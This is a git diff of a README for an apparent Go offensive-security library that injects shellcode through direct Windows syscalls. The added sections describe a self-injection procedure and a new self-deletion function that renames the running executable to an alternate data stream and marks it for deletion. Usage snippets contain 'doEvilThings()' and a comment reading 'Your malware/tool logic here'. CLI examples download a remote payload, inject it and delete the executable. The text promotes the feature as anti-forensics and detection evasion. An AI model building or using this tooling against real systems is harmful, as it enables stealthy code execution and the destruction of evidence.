@@ -171,8 +171,9 @@ The library provides strongly-typed wrappers for common Windows APIs:
 - `NtSetEventBoostPriority` - Boost priority of waiting threads
 
 **High-Level Functions:**
-- `NtInjectSelfShellcode` - Complete self-injection using direct syscalls
+- `NtInjectSelfShellcode` - Complete self-injection using direct syscalls with smart memory compatibility layer
 - `NtInjectRemote` - Complete remote process injection using direct syscalls
+- `SelfDel` - Self-deletion of current executable using NT path format
 - `DirectCall` - Call any Windows API function by address
 
 **Security Bypass Functions:**
@@ -907,31 +908,39 @@ if status == 0 {
 
 #### Self-Injection Examples
 
-The library provides `NtInjectSelfShellcode` for complete shellcode self-injection using only direct syscalls. This function includes a robust memory compatibility layer to solve a critical issue with Go's garbage collector:
+The library provides `NtInjectSelfShellcode` for complete shellcode self-injection using only direct syscalls. This function includes a smart memory compatibility layer that optimizes for performance while providing fallback for reliability:
 
 **PROBLEM:**
 Go's garbage collector allocates byte slices in virtual memory regions that Windows NT syscalls (specifically NtWriteVirtualMemory) sometimes refuse to read from, causing intermittent STATUS_INVALID_PARAMETER (0x8000000D) errors. The same shellcode payload may work on one run and fail on the next, depending on where Go places it in memory.
 
 **SOLUTION:**
-1. First attempt: Allocate "syscall-friendly" memory using NtAllocateVirtualMemory
-2. Copy shellcode from Go memory → Windows-allocated memory  
-3. Execute injection using the Windows-allocated copy
-4. Fallback: If Windows allocation fails, use original Go memory method
-5. Always cleanup allocated memory
+1. **First attempt**: Try direct injection from Go memory → execution buffer (single copy, fastest)
+2. **Fallback only if needed**: Allocate "syscall-friendly" memory using NtAllocateVirtualMemory
+3. **Fallback process**: Copy shellcode Go memory → Windows memory → execution buffer (double copy)
+4. **Always cleanup**: Free allocated memory and close handles
 
-This pattern is more reliable because it ensures the source memory is always in a region that Windows syscalls can read from, while maintaining backward compatibility through the fallback mechanism.
+This pattern provides **optimal performance** in the common case (single memory copy) while maintaining **100% reliability** through the fallback mechanism. Most executions will use the fast path with only one `NtWriteVirtualMemory` call.
 
 The function performs the complete injection process:
-1. **Memory Safety**: Allocates "syscall-friendly" memory region to avoid Go GC issues
-2. **Memory Copy**: Copies shellcode from Go memory to safe Windows-allocated memory
-3. **RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE` for target memory
-4. **Copy Shellcode**: Uses `NtWriteVirtualMemory` to copy from safe memory to target
-5. **Protection**: Changes target memory to `PAGE_EXECUTE_READ` with `NtProtectVirtualMemory`
-6. **Execution**: Creates thread with `NtCreateThreadEx` (true direct syscall)
-7. **Monitoring**: Waits for thread completion with `NtWaitForSingleObject`
-8. **Cleanup**: Frees allocated memory and closes handles with `NtClose`
 
-All operations use **only direct syscalls** - no Win32 API dependencies! The memory compatibility layer tries to ensure 100% reliability across different Go garbage collector behaviors.
+**Fast Path (Direct Injection - Most Common):**
+1. **RW Memory**: Uses `NtAllocateVirtualMemory` with `PAGE_READWRITE` for target memory
+2. **Copy Shellcode**: Uses `NtWriteVirtualMemory` to copy directly from Go memory to target
+3. **Protection**: Changes target memory to `PAGE_EXECUTE_READ` with `NtProtectVirtualMemory`
+4. **Execution**: Creates thread with `NtCreateThreadEx` (true direct syscall)
+5. **Monitoring**: Waits for thread completion with `NtWaitForSingleObject`
+6. **Cleanup**: Closes handles with `NtClose`
+
+**Fallback Path (Safe Memory - Only When Needed):**
+1. **Safe Memory**: Allocates "syscall-friendly" memory region using `NtAllocateVirtualMemory`
+2. **Copy to Safe**: Uses `NtWriteVirtualMemory` to copy Go memory → Windows memory
+3. **Target Memory**: Allocates execution memory with `PAGE_READWRITE`
+4. **Copy to Target**: Uses `NtWriteVirtualMemory` to copy Windows memory → execution buffer
+5. **Protection**: Changes target memory to `PAGE_EXECUTE_READ` with `NtProtectVirtualMemory`
+6. **Execution**: Creates thread with `NtCreateThreadEx`
+7. **Cleanup**: Frees both memory regions and closes handles
+
+All operations use **only direct syscalls** and no Win32 API dependencies! The smart compatibility layer ensures optimal performance with guaranteed reliability.
 
 #### Remote Injection Examples
 
@@ -1467,6 +1476,123 @@ NtWaitForSingleObject: SSN 4  - Normal, no warning
 NtReadFile: SSN 6         - Normal, no warning
 Unknown Function: SSN 0   - Warning (truly suspicious)
 ```
+
+### Self-Deletion Capability
+
+The library includes `SelfDel()` for secure self-deletion of the current executable using NT APIs exclusively. This function employs advanced file manipulation techniques to ensure reliable deletion.
+
+#### **How SelfDel Works**
+
+The self-deletion process uses a sophisticated technique that bypasses standard file locking mechanisms:
+
+1. **NT Path Format**: Uses `\\??\\` prefix for direct NT filesystem access (required for DELETE access)
+2. **DELETE Access**: Opens file handle with `DELETE|SYNCHRONIZE` permissions
+3. **Alternate Data Stream**: Renames file to `:trash` ADS to break existing file locks
+4. **Disposition Flag**: Sets `FILE_DISPOSITION_INFO.DeleteFile = 1` to mark for deletion
+5. **Delayed Deletion**: File is deleted when the last handle is closed (process termination)
+
+#### **Technical Implementation**
+
+```go
+// Simple usage - call anywhere in your program
+winapi.SelfDel()
+
+// The file will be deleted when your process exits
+// No additional cleanup required
+```
+
+#### **Advanced Details**
+
+**Why NT Path Format?**
+- Standard Win32 paths often fail with `STATUS_OBJECT_PATH_SYNTAX_BAD`
+- NT path format (`\\??\\C:\path\file.exe`) provides direct filesystem access
+- Required for obtaining DELETE access on running executables
+
+**Alternate Data Stream Technique:**
+- Renames `file.exe` to `file.exe:trash` 
+- Breaks file locks that prevent deletion
+- Windows filesystem treats ADS as a separate entity
+- Original file becomes inaccessible to new processes
+
+**Deletion Process:**
+- File is marked for deletion but continues running
+- Deletion occurs when process terminates and closes all handles
+- No recovery possible once `FILE_DISPOSITION_INFO` is set
+- Works even if file is currently being executed
+
+#### **Usage Examples**
+
+**Basic Usage:**
+```go
+package main
+
+import winapi "github.com/carved4/go-direct-syscall"
+
+func main() {
+    // Your malware/tool logic here
+    doEvilThings()
+    
+    // Delete this executable on exit
+    winapi.SelfDel()
+    
+    // Program continues normally
+    // File deleted when process terminates
+}
+```
+
+**With Shellcode Injection:**
+```go
+func main() {
+    // Inject payload
+    err := winapi.NtInjectSelfShellcode(shellcode)
+    if err == nil {
+        // Only delete if injection succeeded
+        winapi.SelfDel()
+    }
+}
+```
+
+**Debug Output Example:**
+```
+[DEBUG SELFDEL] Using NT path format: \\??\\C:\path\malware.exe
+[DEBUG SELFDEL] UNICODE_STRING: Length=140, MaxLength=142
+[DEBUG SELFDEL] OBJECT_ATTRIBUTES initialized, Length=48
+[DEBUG SELFDEL] File handle acquired with DELETE access
+[DEBUG SELFDEL] File renamed to ADS
+[DEBUG SELFDEL] File marked for deletion
+[DEBUG SELFDEL] Successfully initiated self-deletion
+```
+
+#### **Integration with Main Tool**
+
+The command-line tool automatically calls `SelfDel()` after successful operations:
+
+```bash
+# These commands will delete the executable after payload injection
+./go-direct-syscall.exe -example
+./go-direct-syscall.exe -url https://server.com/payload.bin
+./go-direct-syscall.exe -url https://server.com/payload.bin -self
+```
+
+**Note**: The `-dump` option does not trigger self-deletion as it's used for research purposes.
+
+#### **Error Handling**
+
+`SelfDel()` includes comprehensive error handling with descriptive NT status messages:
+
+- `STATUS_OBJECT_NAME_INVALID` - Path format issues (automatically uses NT format)
+- `STATUS_OBJECT_PATH_SYNTAX_BAD` - Win32 path rejected (fallback to NT path)
+- `STATUS_ACCESS_DENIED` - Insufficient permissions (rare on self-owned files)
+- `STATUS_SHARING_VIOLATION` - File locked by another process
+
+All errors are logged with debug output but don't halt program execution.
+
+#### **Security Considerations**
+
+- **No Recovery**: Deletion cannot be undone once initiated
+- **Immediate Effect**: File becomes inaccessible to new processes immediately  
+- **Anti-Forensics**: Makes post-execution analysis more difficult
+- **Detection Evasion**: No traces left on filesystem after process termination
 
 ## Security Considerations
 
